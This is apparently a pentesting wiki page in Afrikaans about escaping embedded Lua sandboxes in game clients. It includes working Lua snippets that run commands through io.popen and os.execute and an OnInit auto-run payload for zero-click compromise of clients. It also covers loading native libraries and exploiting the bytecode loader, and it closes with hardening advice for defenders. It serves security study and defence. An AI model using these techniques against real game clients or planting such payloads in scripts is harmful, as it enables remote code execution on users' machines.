# Omseil Lua-sandboxes (embedded VMs, game clients)

Hierdie bladsy versamel praktiese tegnieke om Lua-"sandboxes" wat in toepassings ingebed is (veral game clients, plugins of in-app scripting engines) te enumereer en daaruit te ontsnap. Baie engines stel ’n beperkte Lua-omgewing bloot, maar laat kragtige globals bereikbaar wat arbitrary command execution of selfs native memory corruption moontlik maak wanneer bytecode loaders blootgestel word.

Sleutelidees:
- Behandel die VM as ’n onbekende omgewing: enumereer _G en ontdek watter gevaarlike primitives bereikbaar is.
- Wanneer stdout/print geblokkeer is, misbruik enige in-VM UI/IPC-kanaal as ’n output sink om resultate waar te neem.
- As io/os blootgestel is, het jy dikwels direkte command execution (io.popen, os.execute).
- As load/loadstring/loadfile blootgestel is, kan die uitvoering van vervaardigde Lua-bytecode memory safety in sommige weergawes ondermyn (≤5.1-verifiers kan omseil word; 5.2 het die verifier verwyder), wat advanced exploitation moontlik maak.

## Enumereer die sandboxed environment

- Dump die globale omgewing om bereikbare tables/functions te inventariseer:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Indien geen print() beskikbaar is nie, hergebruik in-VM-kanale. Voorbeeld uit ’n MMO-huisvestingskrip-VM waar chat-uitvoer slegs ná ’n klankoproep werk; die volgende bou ’n betroubare uitvoerfunksie:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generaliseer hierdie patroon vir jou teiken: enige textbox, toast, logger of UI callback wat strings aanvaar, kan as stdout vir reconnaissance optree.

## Direct command execution if io/os is exposed

As die sandbox steeds die standaardbiblioteke io of os blootstel, het jy waarskynlik onmiddellike command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Aantekeninge:

- Uitvoering gebeur binne die kliëntproses; baie anti-cheat/antidebug-lae wat eksterne debuggers blokkeer, sal nie proses-skepping binne die VM voorkom nie.
- Kontroleer ook: `package.loadlib` (laai van arbitrêre DLL/.so), `require` met native modules, LuaJIT se `ffi` (indien teenwoordig), en die debug library (kan privileges binne die VM verhoog).

## Zero-click-snellers via auto-run callbacks

As die host-toepassing scripts na kliënte stoot en die VM auto-run hooks blootstel (bv. OnInit/OnLoad/OnEnter), plaas jou payload daar vir drive-by compromise sodra die script laai:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Enige ekwivalente callback (OnLoad, OnEnter, ens.) veralgemeen hierdie tegniek wanneer scripts outomaties na die kliënt gestuur en daar uitgevoer word.

## Gevaarlike primitives om tydens recon op te spoor

Kyk tydens _G-enumerasie spesifiek na:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: voer source of bytecode uit; ondersteun die laai van onbetroubare bytecode.
- package, package.loadlib, require: dynamic library loading en module-oppervlak.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, en hooks.
- LuaJIT-only: ffi.cdef, ffi.load om native code direk te roep.

Minimale gebruiksvoorbeelde (indien bereikbaar):

Lua se loader API het oor weergawes heen verander: in Lua 5.1 lees `load` vanaf ’n reader function en lees `loadstring` vanaf ’n string; Lua 5.2 se `load` aanvaar óf ’n string óf ’n reader function, en `loadstring` is deprecated as die ekwivalent daarvan.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opsionele eskalasie: misbruik van Lua bytecode loaders

Wanneer load/loadstring/loadfile bereikbaar is, maar io/os beperk is, kan die uitvoering van vervaardigde Lua bytecode lei tot geheue-openbaarmaking en korrupsie-primitiewe. Belangrike feite:
- Lua ≤ 5.1 het ’n bytecode verifier ingesluit wat bekende omseilings het.<sup>[[4]](#references)</sup>
- Lua 5.2 het die verifier heeltemal verwyder (amptelike standpunt: toepassings behoort voorafgecompileerde chunks eenvoudig te verwerp), wat die aanvaloppervlak vergroot indien bytecode loading nie verbied word nie.<sup>[[2]](#references)[[3]](#references)</sup>
- Werkvloeie behels tipies: lek pointers via in-VM-uitvoer, vervaardig bytecode om type confusions te skep (byvoorbeeld rondom FORLOOP of ander opcodes), en skakel dan oor na arbitrary read/write of native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Hierdie pad is engine-/weergawe-spesifiek en vereis RE. Sien die verwysings vir diepgaande ontledings, exploitation primitives en voorbeeld-gadgetry in games.

## Opsporing- en hardening-notas (vir defenders)

- Server side: verwerp of herskryf user scripts; laat veilige APIs volgens ’n allowlist toe; verwyder of bind io, os, load/loadstring/loadfile/dofile, package.loadlib, debug en ffi aan leë waardes.
- Client side: laat Lua met ’n minimale _ENV loop, verbied bytecode loading, stel ’n streng bytecode verifier of signature checks weer in, en blokkeer process creation vanuit die client process.
- Telemetry: genereer ’n waarskuwing wanneer gameclient → child process creation kort ná script load plaasvind; korreleer dit met UI/chat/script events.

## References

- [1] [Hierdie huis spook: ’n dekade oue RCE in die AION-client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode-ontleding: Die ontrafeling van Factorio se Lua-sekuriteitsfoute](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Bespreking oor die verwydering van die bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
